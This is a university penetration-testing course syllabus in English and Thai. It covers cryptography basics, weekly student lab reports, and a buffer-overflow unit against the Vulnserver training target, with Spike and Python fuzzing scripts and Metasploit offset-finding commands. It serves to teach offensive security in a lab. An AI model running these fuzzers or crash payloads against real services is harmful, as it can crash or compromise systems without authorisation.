- Asymmetric Key Cryptography Public-key cryptography, or asymmetric-key
cryptography, is a cryptographic system that uses pairs of keys: (Use two keys and
Two-way methods)
  - public keys, which may be disseminated widely
  - private keys, which are known only to the owner
  - Process
    - Plaintext + Public Key = Ciphertext
    - Ciphertext + Private key = Plaintext
  - Asymmetric Key Algorithms
    - ElGamal is an asymmetric key encryption algorithm which is based on the Diffie–Hellman key exchange
    - [RSA](https://th.wikipedia.org/wiki/%E0%B8%AD%E0%B8%B2%E0%B8%A3%E0%B9%8C%E0%B9%80%E0%B8%AD%E0%B8%AA%E0%B9%80%E0%B8%AD) (Rivest–Shamir–Adleman) is the first public-key cryptosystems and is widely used for secure data transmission, the encryption key is public and distinct from the decryption key which is kept secret (private)
    - Elliptic Curve Cryptography (ECC) provides similar functionality to RSA and implements in smaller devices like cell phones
    - Digital Signature Algorithm (DSA) was developed by the United States government for digital signatures
  
  - Message Digest A message digest is a cryptographic hash function containing a string of digits created by a one-way hashing formula. Message digests are designed to protect the integrity of a piece of data or media to detect changes and alterations to any part of a message
    - MD5 is a widely used hash function producing a 128-bit hash value
    - MD6  is a cryptographic hash function producing 1-bit to 512 bits hash value
    - SHA-1 (Secure Hash Algorithm 1) is a cryptographic hash function which takes an input and produces a 160-bit (20-byte) hash value
    - SHA-2 (Secure Hash Algorithm 2) is a set of cryptographic hash functions consists of functions in 224, 256, 384 or 512 bits: SHA-224, SHA-256, SHA-384, SHA-512
    - HMAC (Hash-based Message Authentication Code) is a specific type of message authentication code (MAC) involving a hash function with a secret cryptographic key
    - Bcrypt is a password hashing function designed by Niels Provos and David Mazières, based on the Blowfish cipher to protect against rainbow table attacks
 
## Lab


- นักศึกษากลุ่มที่ 4 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
--- 
## Week 9@22 Jan 2023
## Lec

## Lab

- นักศึกษากลุ่มที่ 5 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
  
--- 

## Week 10@28 Jan 2023
## Lec
- Exploit Development (Buffer Overflows)
- Buffer Overflows 

- LAB Preparation 
  - Windows 7x86 (32bits)
    - Vulnserver (https://github.com/stephenbradshaw/vulnserver)
    - Immunity Debugger
  - Kali Linux
---
- Spiking 
  - Kali Linux
  - Make Spike script (nano or vim)
  - FIND Vulerable Command by Immunity goto **PAUSED state**

```bash
# Spike script 
# nano stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

```bash
# TRY to RUN script for each command
generic_send_tcp 192.168.x.x 9999 stats.spk 0 0
```
----
- Fuzzing 
  - Python Script for FUZZ
```python
#!/usr/bin/python
#FUZZING Script 
import sys, socket
from time import sleep
buffer = "A" * 100
# Enter IP Address of your HOST Here!!!!
HOST = '............'
PORT = 9999

while True:
  try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.send(('TRUN /. :/' + buffer))
    s.close()
    sleep(1)
    buffer = buffer + "A"*100
  except:
    print "Fuzzing crashed at %s bytes" % str(len(buffer))
    sys.exit()

 ```
--- 
- Find the Offset 
  
Use Tools MSF for find Offset.
  
```bash
# "-l 3000" = 3000 Bytes from previous exercise you will see program stop aarround 3000 Bytes  
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
# Result of command 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
##################
```
Modify Python Script
```python
#!/usr/bin/python
#FUZZING Script 
import sys, socket
from time import sleep
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
# Enter IP Address of your HOST Here!!!!
HOST = '............'
PORT = 9999

while True:
  try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.send(('TRUN /. :/' + offset))
    s.close()
  except:
    print "Error Connection to Server"
    sys.exit()

```

FIND Offfset by copy EIP HEX number to find Offset index 
```bash 
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP-HEX-NUMBER>
```

---
- Overwriting the EIP 
- Finding Bad Characters 
- Finding the Right Mudule
- Generating Shellcode and Gaining Root
- Exploit Development

- นักศึกษากลุ่มที่ 6 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 

--- 

## Week 11@21 Jan 2023
## Lec
- Privilege Escalation
  - Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.
    - [GTFOBins for Linux](https://gtfobins.github.io/)
  - Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom functionality implemented through binaries, known-binary exploits, stored passwords, pass-the-hash.
    - [LOLBAS for Windows](https://lolbas-project.github.io/)
- นักศึกษากลุ่มที่ 7 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
  
--- 

## Week 12@28 Jan 2023
## Lec
## Lab

- นักศึกษากลุ่มที่ 8 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 

  
--- 

## Week 13@4 Feb 2023
## Lec
## Lab

--- 

## Week 13@11 Feb 2023
## Lec
## Lab

--- 

## Week 14@18 Feb 2023
## Lec
## Lab


--- 


## Week 15@25 Feb 2023
กฎหมายที่เกี่ยวข้อง


--- 

## Week 16@4 March 2023
- รายละเอียด LAB Final exam
  - สุ่ม Vulhub Image จากรายงานนักศึกษา จำนวน 2 Images เพื่อนำมาทำการทดสอบระบบ
  - รายงานผลการเจาะระบบอย่างละเอียด
  - A4 1 แผ่น จดอะไรเข้าไปก็ได้ 
--- 

## Week 17@11-26 March 2023
อาจารย์ต้องส่งข้อสอบ Final ก่อนวันที่ 22 Feb 2023

Final Exam Good luck everybody.

--- 
